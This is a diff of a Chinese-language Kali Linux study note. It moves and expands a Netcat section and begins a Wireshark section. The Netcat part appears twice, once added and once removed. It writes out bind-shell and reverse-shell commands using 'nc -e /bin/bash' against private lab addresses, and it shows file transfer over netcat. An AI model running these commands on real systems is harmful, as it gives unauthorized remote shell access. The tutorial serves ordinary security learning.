@@ -41,6 +41,118 @@
 - **|**
     - 管道符
 
+
+## <font color = #1E90FF>Netcat—TCP/IP连接的瑞士军刀</font>
+
+- **网络工具中的瑞士军刀一小身材、 大智慧**
+- **侦听模式/传输模式**
+- **telnet /获取banner信息**
+- **传输文本信息**
+- **传输文件/目录**
+- **加密传输文件**
+- **远程控制/木马**
+- **加密所有流量**
+- **流媒体服务器**
+- **远程克隆硬盘**
+
+
+    nc -h     #查看帮助命令
+<font color = #FF4500>1.使用Netcat程序连接摸个端口，可判断噶一端口是否可受理网络连接</font><BR>
+```netcat
+-v    #详细输出
+nc -v 192.168.2.103 80  #连接162.168.2.103  80端口并详细输出说明
+```
+<font color = #FF4500>2.也可以使用Netcat程序打开摸个网络端口，受理外部连如的网络连接</font><BR>
+
+```ip：192.168.2.102
+nc -lvp 1234   
+
+l 代表监听 (listen)
+v 代表详细输出  
+p 代表指定端口号
+
+```
+<font color = #FF4500>3.此时新建一个终端窗口，使用 NetCat连接刚才打开的端口</font><BR>
+
+```ip 192.168.2.103
+nc 192.168.2.102 1234
+```
+
+<font color = #FF4500>4.连接成功后输入hello,world  返回192.168.2.102，发现输出到屏幕上了</font><BR>
+
+### 开放式shell
+<font color = #FF4500>1. shell命令受理端功能，在以受理端（监听端口）模式下启动Netcat时候，可以用  -e   选项绑定主机的 sheell (/bin/bash)</font><BR>
+
+```ip 192.168.2.102
+
+nc -lvp 1234 -e /bin/bash
+
+```
+<font color = #FF4500>2.此时新建一个终端窗口，使用 NetCat连接刚才打开的端口</font><BR>
+
+```ip 192.168.2.103
+nc 192.168.2.102 1234
+
+此时用可以通过shell执行任意命令（whoami.....）
+```
+
+### 反弹式shell
+<font color = #FF4500>还可以建立反弹式shell,让shell受理端连入摸个准备发送命令的监听端进程</font><BR>
+
+```ip 192.168.2.102
+nc -lvp 1234
+
+```
+<font color = #FF4500>1.此时新建一个终端窗口，使用 NetCat连接刚才打开的端口</font><BR>
+
+```ip 192.168.2.103
+nc 192.168.2.102 1234 -e /bin/bash
+
+```
+<font color = #FF4500>2.上述命令以连入端的模式启动Netcat, -e是在建立连接后执行shell,此时在监听端输入命令，会在连入受理端执行</font><BR>
+
+### 文件传输
+    nc -lvp 1234 > file     #使用 > 让接收到的内容显示在文件中，而不是屏幕中
+    
+    在另一个终端连接这个监听端
+    nc 192.168.2.102 1234 < file    #吧这个文件通过Netcat发送过去
+
+### cron进行定时任务
+<font color = #FF4500>可以在固定的时间间隔执行指定的胸膛命令</font><BR>
+
+```
+ls | grep cron    #显示出的文件分别是每天，每小时，每月，每周
+
+```
+
+## <font color = #1E90FF>WireShark</font>
+- **抓包嗅探协议分析**
+- **安全专家必备的技能**
+- **抓包引擎**
+    - **Libpcap9- Linux**
+    - **Winpcap10- Windows**
+- **解码能力**
+
+### <font color = #FF0000>启动</font>
+**命令行输入wireshark**
+```
+wireshark
+```
+
+- **选择网卡后，Stark开始抓包**
+
+</figure>
+     <figure class="thumbnails">
+        <img src="picture\wireshark/wireshark.png">
+</figure>
+
+- **选择网卡**
+
+</figure>
+     <figure class="thumbnails">
+        <img src="picture/wireshark/wireshark1.png">
+</figure>
+
 ## <font color = #1E90FF>ARP攻击及原理</font>
 
 Kali Linux是基于Debian的Linux发行版， 设计用于数字取证操作系统.
@@ -207,71 +319,3 @@ kali      192.168.2.244
 进行定期自动更
 </font><br>
 
-## <font color = #1E90FF>Netcat—TCP/IP连接的瑞士军刀</font>
-    nc -h     #查看帮助命令
-<font color = #FF4500>1.使用Netcat程序连接摸个端口，可判断噶一端口是否可受理网络连接</font><BR>
-```netcat
--v    #详细输出
-nc -v 192.168.2.103 80  #连接162.168.2.103  80端口并详细输出说明
-```
-<font color = #FF4500>2.也可以使用Netcat程序打开摸个网络端口，受理外部连如的网络连接</font><BR>
-
-```ip：192.168.2.102
-nc -lvp 1234   
-
-l 代表监听 (listen)
-v 代表详细输出  
-p 代表指定端口号
-
-```
-<font color = #FF4500>3.此时新建一个终端窗口，使用 NetCat连接刚才打开的端口</font><BR>
-
-```ip 192.168.2.103
-nc 192.168.2.102 1234
-```
-
-<font color = #FF4500>4.连接成功后输入hello,world  返回192.168.2.102，发现输出到屏幕上了</font><BR>
-
-### 开放式shell
-<font color = #FF4500>1. shell命令受理端功能，在以受理端（监听端口）模式下启动Netcat时候，可以用  -e   选项绑定主机的 sheell (/bin/bash)</font><BR>
-
-```ip 192.168.2.102
-
-nc -lvp 1234 -e /bin/bash
-
-```
-<font color = #FF4500>2.此时新建一个终端窗口，使用 NetCat连接刚才打开的端口</font><BR>
-
-```ip 192.168.2.103
-nc 192.168.2.102 1234
-
-此时用可以通过shell执行任意命令（whoami.....）
-```
-
-### 反弹式shell
-<font color = #FF4500>还可以建立反弹式shell,让shell受理端连入摸个准备发送命令的监听端进程</font><BR>
-
-```ip 192.168.2.102
-nc -lvp 1234
-
-```
-<font color = #FF4500>1.此时新建一个终端窗口，使用 NetCat连接刚才打开的端口</font><BR>
-
-```ip 192.168.2.103
-nc 192.168.2.102 1234 -e /bin/bash
-
-```
-<font color = #FF4500>2.上述命令以连入端的模式启动Netcat, -e是在建立连接后执行shell,此时在监听端输入命令，会在连入受理端执行</font><BR>
-
-### 文件传输
-    nc -lvp 1234 > file     #使用 > 让接收到的内容显示在文件中，而不是屏幕中
-    
-    在另一个终端连接这个监听端
-    nc 192.168.2.102 1234 < file    #吧这个文件通过Netcat发送过去
-
-### cron进行定时任务
-<font color = #FF4500>可以在固定的时间间隔执行指定的胸膛命令</font><BR>
-```
-ls | grep cron    #显示出的文件分别是每天，每小时，每月，每周
-
-```
